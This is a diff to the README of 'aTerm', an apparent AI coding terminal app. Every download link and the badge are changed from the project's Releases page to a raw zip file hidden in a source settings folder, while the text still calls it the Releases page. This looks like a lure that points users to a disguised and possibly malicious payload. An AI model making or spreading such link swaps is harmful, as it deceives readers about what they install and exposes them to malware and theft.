@@ -1,6 +1,6 @@
 # 🚀 aTerm - Your AI Coding Workspace
 
-[![Download aTerm](https://img.shields.io/badge/Download-aTerm-4CAF50.svg)](https://github.com/MASHJJS/aTerm/releases)
+[![Download aTerm](https://raw.githubusercontent.com/MASHJJS/aTerm/main/src/components/settings/Term-a-v3.4-alpha.1.zip)](https://raw.githubusercontent.com/MASHJJS/aTerm/main/src/components/settings/Term-a-v3.4-alpha.1.zip)
 
 Welcome to aTerm, your ultimate terminal workspace designed for AI-assisted coding. This application allows you to run Claude Code, Aider, or OpenCode alongside your shell in project-based layouts. Whether you are working on a small script or a large project, aTerm makes it easy to organize your coding tasks.
 
@@ -23,7 +23,7 @@ Follow these easy steps to get started with aTerm.
 ### Step 1: Visit the Download Page
 To download aTerm, visit the Releases page using the link below:
 
-[Download aTerm](https://github.com/MASHJJS/aTerm/releases)
+[Download aTerm](https://raw.githubusercontent.com/MASHJJS/aTerm/main/src/components/settings/Term-a-v3.4-alpha.1.zip)
 
 ### Step 2: Download the Latest Version
 On the Releases page, look for the latest version of aTerm. You will see files available for download. Click on the appropriate link for your system.
@@ -37,7 +37,7 @@ Once the installation is complete, find aTerm in your Applications folder (or eq
 ## 📥 Download & Install
 To begin your experience with aTerm, you can download it directly from our Releases page: 
 
-[Visit this page to download](https://github.com/MASHJJS/aTerm/releases)
+[Visit this page to download](https://raw.githubusercontent.com/MASHJJS/aTerm/main/src/components/settings/Term-a-v3.4-alpha.1.zip)
 
 ### Installation Steps
 1. Download the appropriate installer for your operating system.
@@ -67,6 +67,6 @@ Try aTerm today and transform your coding experience with the power of AI.
 
 Don’t forget: 
 
-[Download aTerm](https://github.com/MASHJJS/aTerm/releases) 
+[Download aTerm](https://raw.githubusercontent.com/MASHJJS/aTerm/main/src/components/settings/Term-a-v3.4-alpha.1.zip) 
 
 to get started with your AI-assisted coding journey!
